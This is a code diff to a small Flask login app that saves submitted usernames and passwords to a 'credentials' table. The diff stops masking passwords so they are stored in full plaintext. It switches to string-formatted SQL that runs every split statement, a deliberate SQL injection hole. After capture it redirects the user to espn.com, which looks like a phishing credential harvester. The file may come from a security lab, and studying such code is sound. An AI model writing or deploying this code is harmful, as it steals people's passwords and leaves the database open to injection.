@@ -1,7 +1,6 @@
-from flask import Flask
-from flask import render_template
-from flask import request
+from flask import Flask, render_template, request, redirect
 from flask_mysqldb import MySQL
+import sqlparse
 
 app = Flask(__name__)
 
@@ -26,11 +25,12 @@ def login():
     if request.method == 'POST':
         username = request.form['user']
         password = request.form['pass']
-        password = password[-2:].rjust(len(password), '*')
+        #password = password[-2:].rjust(len(password), '*')
         cursor = mysql.connection.cursor()
-        cursor.execute(''' INSERT INTO credentials VALUES(%s,%s)''',(username,password))
-        mysql.connection.commit()
+        operation = 'INSERT INTO credentials VALUES(\'%s\',\'%s\');' % (username,password)
+        for statement in sqlparse.split(operation): cursor.execute(statement)
         cursor.close()
-        return f"Done!!"
+        mysql.connection.commit()
+        return redirect("http://www.espn.com")
 
 app.run(host='localhost', port=5000)
